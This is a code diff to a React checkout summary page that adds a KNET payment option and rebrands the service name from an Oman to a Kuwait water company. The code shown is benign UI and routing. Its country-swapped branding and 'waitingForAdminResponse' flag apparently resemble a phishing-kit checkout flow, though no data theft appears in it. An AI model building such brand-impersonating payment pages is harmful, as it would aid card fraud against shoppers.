@@ -84,7 +84,7 @@ export default function SummaryPayment() {
 
     setIsProcessing(true);
 
-    const paymentMethodLabel = 'بطاقة ائتمان';
+    const paymentMethodLabel = selectedPayment === 'knet' ? 'كي نت' : 'بطاقة ائتمان';
 
     const cartSummary = cart.map(item => {
       const itemPrice = parseFloat(item.variant.price);
@@ -118,7 +118,7 @@ export default function SummaryPayment() {
         grandTotal: grandTotal.toFixed(3),
       },
       current: 'ملخص الدفع',
-      nextPage: selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
+      nextPage: selectedPayment === 'knet' ? 'knet-payment' : selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
       waitingForAdminResponse: false,
     });
 
@@ -133,10 +133,12 @@ export default function SummaryPayment() {
 
     setTimeout(() => {
       setIsProcessing(false);
-      if (selectedPayment === 'card') {
-        window.location.href = `/credit-card-payment?service=${encodeURIComponent('مياه الريان عُمان')}&amount=${grandTotal.toFixed(3)}`;
+      if (selectedPayment === 'knet') {
+        window.location.href = '/knet-payment';
+      } else if (selectedPayment === 'card') {
+        window.location.href = `/credit-card-payment?service=${encodeURIComponent('مياه الريان الكويت')}&amount=${grandTotal.toFixed(3)}`;
       } else {
-        window.location.href = `/bank-transfer?service=${encodeURIComponent('مياه الريان عُمان')}&amount=${grandTotal}`;
+        window.location.href = `/bank-transfer?service=${encodeURIComponent('مياه الريان الكويت')}&amount=${grandTotal}`;
       }
     }, 1500);
   };
@@ -332,6 +334,32 @@ export default function SummaryPayment() {
             </p>
 
             <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+              {/* KNET */}
+              <div
+                onClick={() => setSelectedPayment('knet')}
+                style={{
+                  border: `2px solid ${selectedPayment === 'knet' ? '#1a73e8' : '#ddd'}`,
+                  borderRadius: '8px', padding: '16px', cursor: 'pointer',
+                  background: selectedPayment === 'knet' ? '#f0f7ff' : 'white',
+                  transition: 'all 0.2s',
+                }}
+              >
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  <div style={{
+                    width: '20px', height: '20px', borderRadius: '50%',
+                    border: `2px solid ${selectedPayment === 'knet' ? '#1a73e8' : '#ccc'}`,
+                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
+                  }}>
+                    {selectedPayment === 'knet' && <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#1a73e8' }} />}
+                  </div>
+                  <span style={{ fontWeight: 600, fontSize: '15px', color: '#333' }}>KNET</span>
+                  <div style={{ marginRight: 'auto', marginLeft: 'auto' }} />
+                  <img src="/kpay/knet.png" alt="KNET" style={{ height: '28px', objectFit: 'contain' }} />
+                </div>
+                <p style={{ fontSize: '12px', color: '#888', margin: '6px 0 0 32px' }}>
+                  {isAr ? 'الدفع بواسطة كي نت' : 'Pay with KNET'}
+                </p>
+              </div>
               {/* Credit Card */}
               <div
                 onClick={() => setSelectedPayment('card')}
